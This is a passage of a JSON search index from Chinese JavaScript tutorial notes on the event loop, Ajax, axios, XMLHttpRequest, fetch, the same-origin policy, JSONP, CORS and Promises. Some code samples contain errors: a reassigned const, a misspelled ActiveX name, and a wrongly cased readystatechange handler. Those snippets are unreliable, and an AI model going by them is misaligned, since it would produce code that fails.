同步代码（任务）\",\"slug\":\"_1-1-同步代码-任务\",\"contents\":[\"同步代码：立即放入JS引擎（JS主线程）执行，并原地等待结果，如：console.log()\"]},{\"header\":\"1.2 异步代码（任务）\",\"slug\":\"_1-2-异步代码-任务\",\"contents\":[\"异步代码：先放入宿主环境（浏览器/Node），不必原地等待结果，并不阻塞主线程继续往下执行，异步结果在将来执行\",\"JS 的异步是通过回调函数实现的\",\"一般而言，异步任务有以下三种类型：\",\"普通事件，如 click、resize 等\",\"资源加载，如 load、error 等\",\"定时器，如 setInterval、setTimeout 等\"]},{\"header\":\"2. 执行顺序\",\"slug\":\"_2-执行顺序\",\"contents\":[\"先执行执行栈中的同步任务（同步代码给JS引擎执行）\",\"异步任务交给宿主环境，等时机成熟将任务以回调函数的形式添加到任务队列中（任务队列也称为消息队列）\",\"一旦执行栈中的所有同步任务执行完毕，系统就会按次序读取任务队列中的异步任务，于是被读取的异步任务结束等待状态，进入执行栈，开始执行\",\"演示：\",\"JavaScript-执行机制01.gif\",\"由于主线程不断的重复获得任务、执行任务、再获得任务、再执行，这种机制被称为事件循环（event loop）\"]},{\"header\":\"3. 宏任务和微任务\",\"slug\":\"_3-宏任务和微任务\",\"contents\":[\"JS把异步任务分为宏任务和微任务\",\"由于JS引入了Promise，这样，不需要浏览器，JavaScript引擎自身也能够发起异步任务了\",\"宏任务是由宿主（浏览器、Node）发起\",\"任务\",\"环境\",\"script\",\"浏览器\",\"事件\",\"浏览器\",\"网络请求\",\"浏览器\",\"定时器\",\"浏览器\",\"微任务是由JS引擎发起\",\"任务\",\"环境\",\"Promise\",\"JS引擎\",\"Promise本身同步，then/catch的回调函数是异步的\",\"先执行同步任务，同步任务执行完毕后，如果微任务队列中有任务，则执行微任务，然后看宏任务队列中是否有任务，再执行宏任务\"]}]},\"/front-end/javascript-notes/31-JavaScript-Ajax.html\":{\"title\":\"Ajax\",\"contents\":[{\"header\":\"1. 认识Ajax\",\"slug\":\"_1-认识ajax\",\"contents\":[]},{\"header\":\"1.1 Ajax简介\",\"slug\":\"_1-1-ajax简介\",\"contents\":[\"Ajax 全称为 Asynchronous JavaScript And XML，就是异步 JS 和 XML\",\"通过 AJAX 可以在浏览器中向服务器发送异步请求，AJAX 不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式，是前后台交互的能力\",\"传统网站的问题：\",\"为了获取数据，需要重新加载，浪费资源，增加等待时间，性能不好\",\"验证表单过程中，一项内容不合格，页面需要重新加载，体验不好\",\"解决问题:\",\"使用 Ajax 可以无刷新获取数据\"]},{\"header\":\"1.2 Ajax的特点\",\"slug\":\"_1-2-ajax的特点\",\"contents\":[\"Ajax 的优点：\",\"可以无需刷新页面而与服务器端进行通信\",\"允许你根据用户事件来更新部分页面内容\",\"JS 原生支持\",\"Ajax 的缺点：\",\"没有浏览历史，不能回退\",\"存在跨域问题（同源）\",\"SEO（Search Engine Optimization，搜索引擎优化）不友好，爬虫无法爬取\"]},{\"header\":\"1.3 XML简介\",\"slug\":\"_1-3-xml简介\",\"contents\":[\"XML 可扩展标记语言，被设计用来传输和存储数据\",\"XML 和 HTML 类似，不同的是 HTML 中都是预定义标签，而 XML 中没有预定义标签，全都是自定义标签，用来表示一些数据\",\"比如说我有一个学生数据：name=\\\"孙悟空\\\";age=18;gender=\\\"男\\\";\",\"用 XML 表示：\",\"<student> <name>孙悟空</name> <age>18</age> <gender>男</gender> </student> \",\"现在已经被 JSON 取代了，用 JSON 表示：\",\"{\\\"name\\\":\\\"孙悟空\\\",\\\"age\\\":18,\\\"gender\\\":\\\"男\\\"} \"]},{\"header\":\"2. axios\",\"slug\":\"_2-axios\",\"contents\":[]},{\"header\":\"2.1 基本使用\",\"slug\":\"_2-1-基本使用\",\"contents\":[\"因为 axios 库语法简单，让我们有更多精力关注在与服务器通信上，后续再学习 XMLHttpRequest 对象了解 Ajax 底层原理\",\"axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中\",\"https://www.npmjs.com/package/axios\",\"引入axios：\",\"<script src=\\\"https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js\\\"></script> \",\"引入后会得到一个axios函数，axios函数的基本使用语法：\",\"axios({ url: '目标资源地址' }).then((result) => { // 对服务器返回的数据做后续处理 }) \",\"注意：请求的 url 地址, 就是标记资源的网址\"]},{\"header\":\"2.2 认识URL\",\"slug\":\"_2-2-认识url\",\"contents\":[\"统一资源定位符，简称网址，用于定位网络中的资源（资源指的是：网页，图片，数据，视频，音频等等）\",\"URL的组成：协议，域名，资源路径（URL 组成有很多部分，我们先掌握这3个重要的部分即可）\",\"什么是http协议：超文本传输协议，规定了浏览器和服务器传递数据的格式\",\"什么是域名：标记服务器在互联网当中的方位，网络中有很多服务器，你想访问哪一台，就需要知道它的域名才可以\",\"什么是资源路径：一个服务器内有多个资源，用于标识你要访问的资源具体的位置\"]},{\"header\":\"2.3 URL查询参数\",\"slug\":\"_2-3-url查询参数\",\"contents\":[\"查询参数可以携带给服务器额外信息，让服务器返回我想要的某一部分数据而不是全部数据\",\"语法：在URL网址后面用?拼接格式：http://xxxx.com/xxx/xxx?参数名1=值1&参数名2=值2\",\"axios使用params配置项即可携带查询参数：\",\"axios({ url: '目标资源地址', params: { 参数名: 值 } }).then(result => { // 对服务器返回的数据做后续处理 }) \"]},{\"header\":\"2.4 常用请求方法和数据提交\",\"slug\":\"_2-4-常用请求方法和数据提交\",\"contents\":[\"请求方法是一些固定单词的英文，例如：GET，POST，PUT，DELETE，PATCH（这些都是http协议规定的），每个单词对应一种对服务器资源要执行的操作\",\"请求方法\",\"操作\",\"GET\",\"获取数据\",\"POST\",\"数据提交\",\"PUT\",\"修改数据（全部）\",\"DELETE\",\"删除数据\",\"PATCH\",\"修改数据（部分）\",\"注意：前面我们获取数据其实用的就是GET请求方法，但是axios内部设置了默认请求方法就是GET，我们就没有写\",\"axios提交数据到服务器：\",\"axios({ url: '目标资源地址', method: '请求方法', data: { 参数名: 值 } }).then(result => { // 对服务器返回的数据做后续处理 }) \"]},{\"header\":\"2.5 axios错误处理\",\"slug\":\"_2-5-axios错误处理\",\"contents\":[\"使用axios的.catch方法，可以捕获请求响应的错误并做后续处理，语法如下：\",\"axios({ // ...请求选项 }).then(result => { // 处理成功数据 }).catch(error => { // 处理失败错误 }) \"]},{\"header\":\"2.6 设置baseURL\",\"slug\":\"_2-6-设置baseurl\",\"contents\":[\"作用：提取公共前缀地址，配置后axios请求时都会baseURL + url\",\"语法：\",\"axios.defaults.baseURL = '基地址' \"]},{\"header\":\"2.7 请求拦截器\",\"slug\":\"_2-7-请求拦截器\",\"contents\":[\"在发送请求之前，触发配置函数，对请求参数进行额外配置\",\"axios.interceptors.request.use(function (config) { // 在发送请求之前做些什么 return config }, function (error) { // 对请求错误做些什么 return Promise.reject(error) }) \"]},{\"header\":\"2.8 响应拦截器\",\"slug\":\"_2-8-响应拦截器\",\"contents\":[\"响应回到 then/catch 之前，触发拦截函数，对响应结果统一处理\",\"// 添加响应拦截器 axios.interceptors.response.use(function (response) { // 2xx 范围内的状态码都会触发该函数 // 对响应数据做点什么 return response }, function (error) { // 超出 2xx 范围的状态码都会触发该函数 // 对响应错误做点什么 return Promise.reject(error) }) \"]},{\"header\":\"3. HTTP协议\",\"slug\":\"_3-http协议\",\"contents\":[\"HTTP 协议规定了浏览器和服务器返回内容的格式\"]},{\"header\":\"3.1 请求报文\",\"slug\":\"_3-1-请求报文\",\"contents\":[\"请求报文：是浏览器按照协议规定发送给服务器的内容\",\"这里的格式包含：\",\"请求行：请求方法，URL，协议\",\"请求头：以键值对的格式携带的附加信息，比如：Content-Type（指定了本次传递的内容类型）\",\"空行：分割请求头，空行之后的是发送给服务器的资源\",\"请求体：发送的资源\"]},{\"header\":\"3.2 响应报文\",\"slug\":\"_3-2-响应报文\",\"contents\":[\"响应报文：是服务器按照协议固定的格式，返回给浏览器的内容\",\"响应报文的组成：\",\"响应行（状态行）：协议，HTTP响应状态码，状态信息\",\"响应头：以键值对的格式携带的附加信息，比如：Content-Type（告诉浏览器，本次返回的内容类型）\",\"空行：分割响应头，控制之后的是服务器返回的资源\",\"响应体：返回的资源\",\"HTTP响应状态码，用来表明请求是否成功完成：\",\"状态码\",\"说明\",\"1xx\",\"信息\",\"2xx\",\"成功\",\"3xx\",\"重定向消息\",\"4xx\",\"客户端错误\",\"5xx\",\"服务端错误\"]},{\"header\":\"4. form-serialize插件\",\"slug\":\"_4-form-serialize插件\",\"contents\":[\"使用form-serialize插件，可以快速收集目标表单范围内表单元素的值\",\"官网：form-serialize - npm (npmjs.com)\",\"form-serialize 插件语法：\",\"引入form-serialize插件到自己网页中\",\"使用 serialize 函数\",\"参数1：要获取的form表单标签对象（要求表单元素需要有 name 属性-用来作为收集的数据中属性名）\",\"参数2：配置对象 \",\"hash： \",\"true - 收集出来的是一个 JS 对象结构\",\"false - 收集出来的是一个查询字符串格式\",\"empty： \",\"true - 收集空值\",\"false - 不收集空值\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>form-serialize插件使用</title> </head> <body> <form class=\\\"example-form\\\"> <input type=\\\"text\\\" name=\\\"username\\\"> <br> <input type=\\\"text\\\" name=\\\"password\\\"> <br> <input type=\\\"button\\\" class=\\\"btn\\\" value=\\\"提交\\\"> </form> <!-- 目标：在点击提交时，使用form-serialize插件，快速收集表单元素值 1. 把插件引入到自己网页中 --> <script src=\\\"./lib/form-serialize.js\\\"></script> <script> document.querySelector('.btn').addEventListener('click', () => { /** * 2. 使用serialize函数，快速收集表单元素的值 * 参数1：要获取哪个表单的数据 * 表单元素设置name属性，值会作为对象的属性名 * 建议name属性的值，最好和接口文档参数名一致 * 参数2：配置对象 * hash 设置获取数据结构 * - true：JS对象（推荐）一般请求体里提交给服务器 * - false: 查询字符串 * empty 设置是否获取空值 * - true: 获取空值（推荐）数据结构和标签结构一致 * - false：不获取空值 */ const form = document.querySelector('.example-form') const data = serialize(form, { hash: true, empty: true }) // const data = serialize(form, { hash: false, empty: true }) // const data = serialize(form, { hash: true, empty: false }) console.log(data) //{username: 'xxx', password: 'xxx'} }) </script> </body> </html> \"]},{\"header\":\"5. 图片上传\",\"slug\":\"_5-图片上传\",\"contents\":[\"方法：\",\"先获取图片文件对象\",\"使用 FormData 表单数据对象装入（因为图片是文件而不是以前的数字和字符串了所以传递文件一般需要放入 FormData 以键值对-文件流的数据传递（可以查看请求体-确认请求体结构）\",\"const fd = new FormData() fd.append(参数名, 值) \",\"提交表单数据对象，使用服务器返回图片 url 网址\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>图片上传</title> </head> <body> <!-- 文件选择元素 --> <input type=\\\"file\\\" class=\\\"upload\\\"> <img src=\\\"\\\" alt=\\\"\\\" class=\\\"my-img\\\"> <script src=\\\"https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js\\\"></script> <script> /** * 目标：图片上传，显示到网页上 * 1. 获取图片文件 * 2. 使用 FormData 携带图片文件 * 3. 提交到服务器，获取图片url网址使用 */ // 文件选择元素->change改变事件 document.querySelector('.upload').addEventListener('change', e => { // 1. 获取图片文件 console.log(e.target.files[0]) // 2. 使用 FormData 携带图片文件 const fd = new FormData() fd.append('img', e.target.files[0]) // 3. 提交到服务器，获取图片url网址使用 axios({ url: '接口地址', method: 'POST', data: fd }).then(result => { console.log(result) // 取出图片url网址，用img标签加载显示 const imgUrl = result.data.data.url document.querySelector('.my-img').src = imgUrl }) }) </script> </body> </html> \"]},{\"header\":\"6. 原生Ajax\",\"slug\":\"_6-原生ajax\",\"contents\":[]},{\"header\":\"6.1 基本使用\",\"slug\":\"_6-1-基本使用\",\"contents\":[\"在 JS 中有内置的构造函数来创建 Ajax 对象，创建 Ajax 对象以后，我们就可以使用 Ajax 对象的方法去发送请求和接受响应\",\"语法：\",\"// IE9及以上 const xhr = new XMLHttpRequest() // IE9以下 const xhr = new ActiveXObject('Mricosoft.XMLHTTP') xhr.open('请求方法', '请求url网址') xhr.addEventListener('loadend', () => { // 响应结果 console.log(xhr.response) }) xhr.send() \",\"使用步骤：\",\"创建 XHR 对象\",\"调用 open 方法，设置 url 和请求方法\",\"监听 loadend 事件，接收结果\",\"调用 send 方法，发起请求\"]},{\"header\":\"6.2 查询参数\",\"slug\":\"_6-2-查询参数\",\"contents\":[\"查询参数：携带额外信息给服务器，返回匹配想要的数据\",\"查询参数要携带的位置和语法：http://xxxx.com/xxx/xxx?参数名1=值1&参数名2=值2\",\"方法：在调用 open 方法的时候，在url?后面按照指定格式拼接参数名和值\",\"例：\",\"/** * 目标：使用XHR携带查询参数，展示某个省下属的城市列表 */ const xhr = new XMLHttpRequest() xhr.open('GET', 'http://hmajax.itheima.net/api/city?pname=辽宁省') xhr.addEventListener('loadend', () => { console.log(xhr.response) const data = JSON.parse(xhr.response) console.log(data) document.querySelector('.city-p').innerHTML = data.list.join('<br>') }) xhr.send() \",\"如果有多个查询参数，如果我们自己拼接的话，很麻烦，这里用URLSearchParams 把参数对象转成参数名1=值1&参数名2=值2格式的字符串，语法如下：\",\"// 1. 创建 URLSearchParams 对象 const paramsObj = new URLSearchParams({ 参数名1: 值1, 参数名2: 值2 }) // 2. 生成指定格式查询参数字符串 const queryString = paramsObj.toString() // 结果：参数名1=值1&参数名2=值2 \"]},{\"header\":\"6.3 数据提交\",\"slug\":\"_6-3-数据提交\",\"contents\":[\"步骤和语法：我们需要自己设置请求头Content-Type：xxx，来告诉服务器端，\",\"需要在 send 方法调用时，传入请求体携带\",\"例：\",\"const xhr = new XMLHttpRequest() xhr.open('请求方法', '请求url网址') xhr.addEventListener('loadend', () => { console.log(xhr.response) }) // 1. 设置请求头，告诉服务器，我传递的内容类型，是 JSON 字符串 xhr.setRequestHeader('Content-Type', 'application/json') // 2. 准备数据并转成 JSON 字符串 const user = { username: 'xxxxxxxx', password: 'xxxxxxxx' } const userStr = JSON.stringify(user) // 3. 发送请求体数据 xhr.send(userStr) \"]},{\"header\":\"6.4 请求响应判断\",\"slug\":\"_6-4-请求响应判断\",\"contents\":[\"AJAX 如何判断是否请求响应成功：响应状态码在大于等于 200 并且小于 300 的范围是成功的\",\"响应状态码：xhr.status\"]},{\"header\":\"6.5 封装简易axios\",\"slug\":\"_6-5-封装简易axios\",\"contents\":[\"步骤：\",\"定义 myAxios 函数，接收配置对象，返回 Promise 对象\",\"发起 XHR 请求，默认请求方法为 GET\",\"调用成功/失败的处理程序\",\"使用 myAxios 函数\",\"代码：\",\"// 1. 定义myAxios函数，接收配置对象，返回Promise对象 function myAxios(config){ return new Promise((resolve,reject)=>{ // 2. 发起XHR请求，默认请求方法为GET const xhr = new XMLHttpRequest() xhr.open(config.method || 'GET', config.url) xhr.addEventListener('loadend',()=>{ // 3. 调用成功/失败的处理程序 if(xhr.status>=200&&xhr.status<300){ resolve(JSON.parse(xhr.response)) }else{ reject(new Error(xhr.response)) } }) xhr.send() }) } // 4. 使用myAxios函数 myAxios({ url:'目标资源地址' }).then(result=>{ }).catch(error=>{ }) \",\"修改代码支持传递查询参数功能，步骤：\",\"myAxios 函数调用后，判断 params 选项\",\"基于 URLSearchParams 转换查询参数字符串\",\"使用封装的 myAxios 函数\",\"代码：\",\"function myAxios(config) { return new Promise((resolve, reject) => { const xhr = new XMLHttpRequest() // 1. 判断有params选项，携带查询参数 if (config.params) { // 2. 使用URLSearchParams转换，并携带到url上 const paramsObj = new URLSearchParams(config.params) const queryString = paramsObj.toString() // 把查询参数字符串，拼接在url？后面 config.url += `?${queryString}` } xhr.open(config.method || 'GET', config.url) xhr.addEventListener('loadend', () => { if (xhr.status >= 200 && xhr.status < 300) { resolve(JSON.parse(xhr.response)) } else { reject(new Error(xhr.response)) } }) xhr.send() }) } \",\"修改代码支持传递请求体数据，步骤：\",\"myAxios 函数调用后，判断 data 选项\",\"转换数据类型，在 send 方法中发送\",\"使用封装的 myAxios 函数\",\"代码：\",\"function myAxios(config) { return new Promise((resolve, reject) => { const xhr = new XMLHttpRequest() if (config.params) { const paramsObj = new URLSearchParams(config.params) const queryString = paramsObj.toString() config.url += `?${queryString}` } xhr.open(config.method || 'GET', config.url) xhr.addEventListener('loadend', () => { if (xhr.status >= 200 && xhr.status < 300) { resolve(JSON.parse(xhr.response)) } else { reject(new Error(xhr.response)) } }) // 1. 判断有data选项，携带请求体 if (config.data) { // 2. 转换数据类型，在send中发送 const jsonStr = JSON.stringify(config.data) xhr.setRequestHeader('Content-Type', 'application/json') xhr.send(jsonStr) } else { // 如果没有请求体数据，正常的发起请求 xhr.send() } }) } \"]},{\"header\":\"6.6 readyStateChange\",\"slug\":\"_6-6-readystatechange\",\"contents\":[\"在 Ajax 对象中有一个事件，叫做 readyStateChange 事件，这个事件是专门用来监听 Ajax 对象的 readyState 值改变的的行为，也就是说只要 readyState 的值发生变化了，那么就会触发该事件，所以我们就在这个事件中来监听 Ajax 的 readyState 是不是到 4 了\",\"const xhr = new XMLHttpRequest() xhr.open('get', '接口') xhr.send() xhr.onreadyStateChange = function () { // 每次 readyState 改变的时候都会触发该事件 // 我们就在这里判断 readyState 的值是不是到 4 // 并且 http 的状态码是不是 200 ~ 299 if (xhr.readyState === 4 && /^2\\\\d{2}$/.test(xhr.status)) { // 这里表示验证通过 // 我们就可以获取服务端给我们响应的内容了 } } \"]},{\"header\":\"6.7 responseText\",\"slug\":\"_6-7-responsetext\",\"contents\":[\"Ajax 对象中的 responseText 成员就是用来记录服务端给我们的响应体内容的，所以我们就用这个成员来获取响应体的内容\",\"const xhr = new XMLHttpRequest() xhr.open('get', '接口') xhr.send() xhr.onreadyStateChange = function () { if (xhr.readyState === 4 && /^2\\\\d{2}$/.test(xhr.status)) { // 我们在这里直接打印 xhr.responseText 来查看服务端给我们返回的内容 console.log(xhr.responseText) } } \"]},{\"header\":\"7. fetch\",\"slug\":\"_7-fetch\",\"contents\":[\"XMLHttpRequest 是一个设计粗糙的 API，配置和调用方式非常混乱，而且基于事件的异步模型写起来不友好\",\"fetch 使用 Promise 和链式调用来处理异步操作，提供了更加简洁明了的语法，从而简化了代码的编写和维护\"]},{\"header\":\"7.1 基本使用\",\"slug\":\"_7-1-基本使用\",\"contents\":[\"fetch(\\\"接口地址\\\") .then(response=>response.json()) .then(res=>{ console.log(res) }) fetch(\\\"接口地址\\\",{ method:\\\"POST\\\", headers:{ \\\"content-type\\\":\\\"application/json\\\" }, body:JSON.stringify({ username:\\\"kerwin\\\", password:\\\"123\\\" }) }) .then(res=>res.json()) .then(res=>{ console.log(res) }) fetch(\\\"http://localhost:3000/users/5\\\",{ method:\\\"PUT\\\", headers:{ \\\"content-type\\\":\\\"application/json\\\" }, body:JSON.stringify({ username:\\\"kerwin\\\", password:\\\"456\\\" }) }) .then(res=>res.json()) .then(res=>{ console.log(res) }) fetch(\\\"http://localhost:3000/users/5\\\",{ method:\\\"DELETE\\\" }) .then(res=>res.json()) .then(res=>{ console.log(res) }) \"]},{\"header\":\"7.2 错误处理\",\"slug\":\"_7-2-错误处理\",\"contents\":[\"fetch(\\\"http://localhost:3000/users1\\\") .then(res=>{ if(res.ok){ return res.json() }else{ return Promise.reject({ status:res.status, statusText:res.statusText }) } }) .then(res=>{ console.log(res) }) .catch(err=>{ console.log(err) }) \"]},{\"header\":\"8. 同源策略(Same-origin policy)\",\"slug\":\"_8-同源策略-same-origin-policy\",\"contents\":[\"一个 URL 有三部分组成：协议、域名 (指向主机)、端口，只有这三个完全相同的 URL 才能称之为同源。如下，能和 http://www.example.com/dir1/index.html 同源的是\",\"URL\",\"结果\",\"原因\",\"http://www.example.com/dir2/api\",\"同源\",\"只有路径不同\",\"https://www.example.com/api\",\"不同源\",\"协议不同\",\"http://www.example.com:81/dir1/etc.html\",\"不同源\",\"端口不同 ( http:// 默认端口是80)\",\"http://www.kerwin.com/dir1/other.html\",\"不同源\",\"域名不同\",\"无法读取非同源网页的 Cookie、LocalStorage\",\"无法接触非同源网页的 DOM\",\"无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）\",\"注意：同源策略是浏览器的行为，是为了保护本地数据不被 JavaScript 代码获取回来的数据污染，因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收\"]},{\"header\":\"9. 解决跨域问题\",\"slug\":\"_9-解决跨域问题\",\"contents\":[]},{\"header\":\"9.1 JSONP\",\"slug\":\"_9-1-jsonp\",\"contents\":[\"Jsonp (JSON with Padding) 是 json 的一种\\\"使用模式\\\"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据\",\"script 标签可以做到这一点：\",\"function test(data) { console.log('111', data) } const script = document.createElement('script') script.src ='http://www.runoob.com/try/ajax/jsonp.php?jsoncallback=test' document.body.appendChild(script) //1.script 没有跨域限制 //2.后端配合返回的是 函数()调用 //3.前端提前声明好这个函数 //jsonp只能get请求 无法post put delete \",\"实例：\",\"<body> <input type=\\\"text\\\" id=\\\"mysearch\\\" /> <ul id=\\\"list\\\"></ul> <script> mysearch.oninput = function(evt){ console.log(evt.target.value) if(!evt.target.value){ list.innerHTML = \\\"\\\" return } const oscript = document.createElement(\\\"script\\\") oscript.src = `https://www.baidu.com/sugrec?pre=1&p=3&ie=utf-8&json=1&prod=pc&from=pc_web&sugsid=36542,36464,36673,36454,31660,36692,36166,36695,36697,36570,36074,36655,36345,26350,36469,36314&wd=${evt.target.value}&req=2&csor=1&cb=test&_=1656294200527` document.body.appendChild(oscript) oscript.onload = function(){ oscript.remove() } } function test(obj){ console.log(obj.g) list.innerHTML = obj.g.map(item=> `<li>${item.q}</li>` ).join(\\\"\\\") } </script> </body> \"]},{\"header\":\"9.2 CORS\",\"slug\":\"_9-2-cors\",\"contents\":[\"CORS（Cross-Origin Resource Sharing），跨域资源共享\",\"CORS 是官方的跨域解决方 案，它的特点是不需要在客户端做任何特殊的操作，完全在服务器中进行处理，支持 get 和post 请求\",\"跨域资源共享标准新增了一组HTTP 首部字段，允许服务器声明哪些来源站点通过浏览器有权限访问哪些资源\",\"CORS 是通过设置一个响应头来告诉浏览器，该请求允许跨域，浏览器收到该响应以后就会对响应放行\"]},{\"header\":\"9.3 反向代理\",\"slug\":\"_9-3-反向代理\",\"contents\":[\"使用nginx配置反向代理\"]}]},\"/front-end/javascript-notes/32-JavaScript-Promise.html\":{\"title\":\"Promise\",\"contents\":[{\"header\":\"1. Promise是什么\",\"slug\":\"_1-promise是什么\",\"contents\":[\"Promise 是异步编程的一种解决方案，比传统的解决方案使用回调函数, 更合理、更强大。可以将异步操作转化为类似同步操作的编码风格，并且在异步操作完成后可以方便地获取到操作结果或者操作失败的原因。ES6 将其写进了语言标准，统一了用法，原生提供了 Promise 对象\",\"指定回调函数方式更灵活易懂\",\"解决异步回调地狱的问题\"]},{\"header\":\"2. 回调地狱\",\"slug\":\"_2-回调地狱\",\"contents\":[\"回调函数的概念：指的是将一个函数作为参数传递给另一个函数，并在特定事件或条件发生时被调用。回调函数通常用于异步编程中，用于处理在异步操作完成后执行的操作。在这种情况下，我们将一个函数传递给一个异步函数，当异步操作完成时，该函数将被调用以处理结果\",\"回调地狱的概念：在回调函数中嵌套回调函数，一直嵌套下去就形成了回调函数地狱\",\"缺点：可读性差，异常无法捕获，耦合性严重，牵一发动全身\",\"在ES6之前，我们用回调函数的形式来实现异步操作，容易出现回调地狱问题\",\"比如我们有一个需求，我要先开车，后购物，都是异步操作，需要回调函数实现\",\"按顺序的话：\",\"function drive(fn) { setTimeout(() => { fn(); }, 2000); } function shopping(fn) { setTimeout(() => { fn(); }, 1000); } function run() { drive(() => { console.log('开车'); }); shopping(() => { console.log('购物'); }); } run(); \",\"结果是\",\"购物 开车 \",\"我们需要通过在回调函数中调用才可以实现：\",\"function drive(fn) { setTimeout(() => { fn(); }, 2000); } function shopping(fn) { setTimeout(() => { fn(); }, 1000); } function run() { drive(() => { console.log('开车'); shopping(() => { console.log('购物'); }); }); } run(); \",\"结果：\",\"开车 购物 \",\"这样就产生了回调地狱问题\",\"再比如我们发送三个 Ajax 请求：第一个正常发送，第二个请求需要第一个请求的结果中的某一个值作为参数，第三个请求需要第二个请求的结果中的某一个值作为参数\",\"axios({ url: 'xxx' }).then((result) => { const a = result.data.list[0]; axios({ url: 'xxx', params: { a } }).then((result) => { const b = result.data.list[0]; axios({ url: 'xxx', params: { a, b } }).then((result) => { const c = result.data.list[0]; }); }); }); \"]},{\"header\":\"3. Promise使用\",\"slug\":\"_3-promise使用\",\"contents\":[\"使用步骤：\",\"new Promise 对象执行异步任务\",\"用 resolve 关联 then 的回调函数传递成功结果\",\"用 reject 关联 catch 的回调函数传递失败结果\",\"语法：\",\"// 1. 创建 Promise 对象 const p = new Promise((resolve, reject) => { // 2. 执行异步任务-并传递结果 // 成功调用: resolve(值); 触发 then() 执行 // 失败调用: reject(值); 触发 catch() 执行 }); // 3. 接收结果 p.then(result => { // 成功 }).catch(error => { // 失败 }); \",\"例：\",\"const p = new Promise((resolve, reject) => { resolve('任务成功得到的数据'); reject('任务失败的信息'); }); p.then((result) => { console.log(result); }).catch((error) => { console.log(error); }); \",\"结果：\",\"任务成功得到的数据 \"]},{\"header\":\"4. Promise对象的状态\",\"slug\":\"_4-promise对象的状态\",\"contents\":[\"Promise 对象通过自身的状态，来控制异步操作\",\"Promise 实例具有三种状态：\",\"异步操作未完成（pending）（待定）\",\"异步操作成功（fulfilled）（已兑现）\",\"异步操作失败（rejected）（已拒绝）\",\"这三种的状态的变化途径只有两种：\",\"从“未完成”到“成功”\",\"从“未完成”到“失败”\",\"一旦状态发生变化，就凝固了，不会再有新的状态变化。这也是 Promise 这个名字的由来，它的英语意思是“承诺”，一旦承诺生效，就不再改变了。这也意味着，Promise 实例的状态变化只可能发生一次\",\"因此，Promise 的最终结果只有两种：\",\"异步操作成功，Promise 实例传回一个值（value），状态变为fulfilled\",\"异步操作失败，Promise 实例抛出一个错误（error），状态变为rejected\",\"Promise01.png\"]},{\"header\":\"5. Promise链式调用\",\"slug\":\"_5-promise链式调用\",\"contents\":[\"概念：依靠then()方法会返回一个新生成的 Promise 对象的特性，继续串联下一环任务，直到结束\",\"利用Promise链式调用可以解决回调函数嵌套问题\",\"Promise02.png\",\"我们利用Promise链式调用解决上面的问题\",\"function drive() { return new Promise((resolve, reject) => { setTimeout(() => { resolve('开车'); }, 2000); }); } function shopping() { return new Promise((resolve, reject) => { setTimeout(() => { resolve('购物'); }, 1000); }); } function run() { drive() .then((data) => { console.log(data); return shopping(); }) .then((data) => { console.log(data); }); } run(); \",\"解决Ajax回调地狱：\",\"const a = ''; axios({ url: 'xxx' }).then(result => { a = result.data.list[0]; return axios({ url: 'xxx', params: { a } }); }).then(result => { const b = result.data.list[0]; return axios({ url: 'xxx', params: { a, b } }); }).then(result => { const c = result.data.list[0]; }); \"]},{\"header\":\"6. async与await\",\"slug\":\"_6-async与await\",\"contents\":[\"在 async 函数内，使用 await 关键字取代 then 函数，等待获取 Promise 对象成功状态的结果值\"]},{\"header\":\"1. 基本使用\",\"slug\":\"_1-基本使用\",\"contents\":[\"await 后面是一个 Promise 对象，返回该对象的结果。如果不是 Promise 对象，就直接返回对应的值\",\"async function(){ await promise对象; } \",\"我们来将上面的例子优化一下：\",\"function drive() { return new Promise((resolve, reject) => { setTimeout(() => { resolve('开车'); }, 2000); }); } function shopping() { return new Promise((resolve, reject) => { setTimeout(() => { resolve('购物'); }, 1000); }); } async function run() { const result1 = await drive(); const result2 = await shopping(); console.log(result1); console.log(result2); } run(); \",\"优化Ajax回调地狱：\",\"async function getData() { const aObj = await axios({ url: 'xxx' }); const a = aObj.data.list[0]; const bObj = await axios({ url: 'xxx', params: { a } }); const b = bObj.data.list[0]; const cObj = await axios({ url: 'xxx', params: { a, b } }); const c = cObj.data.list[0]; }; getData(); \"]},{\"header\":\"2. 错误处理\",\"slug\":\"_2-错误处理\",\"contents\":[\"使用try和catch\",\"try { // 要执行的代码 } catch (error) { // error 接收的是，错误消息 // try 里代码，如果有错误，直接进入这里执行 }; \",\"try 里有报错的代码，会立刻跳转到 catch 中\",\"例：\",\"async function getData() { // 1. try包裹可能产生错误的代码 try { const aObj = await axios({ url: 'xxx' }); const a = aObj.data.list[0]; const bObj = await axios({ url: 'xxx', params: { a } }); const b = bObj.data.list[0]; const cObj = await axios({ url: 'xxx', params: { a, b } }); const c = cObj.data.list[0]; } catch (error) { // 2. 接着调用catch块，接收错误信息 // 如果try里某行代码报错后，try中剩余的代码不会执行了 console.dir(error) } } getData(); \"]},{\"header\":\"7. Promise对象方法\",\"slug\":\"_7-promise对象方法\",\"contents\":[\"Promise 是一个对象，也是一个构造函数\"]},{\"header\":\"1. Promise.resolve\",\"slug\":\"_1-promise-resolve\",\"contents\":[\"将现有对象转为 Promise 对象\",\"Promise.resolve('xxx'); // 等价于 new Promise(resolve => resolve('xxx')); \"]},{\"header\":\"2. Promise.reject\",\"slug\":\"_2-promise-reject\",\"contents\":[\"Promise.reject(reason) 方法也会返回一个新的 Promise 实例，该实例的状态为 rejected\",\"const p = Promise.reject('error'); // 等同于 const p = new Promise((resolve, reject) => reject('error')); \"]},{\"header\":\"3. Promise.all\",\"slug\":\"_3-promise-all\",\"contents\":[\"Promise.all()方法用于将多个 Promise 实例，包装成一个新的 Promise 实例\",\"const p = Promise.all([p1, p2, 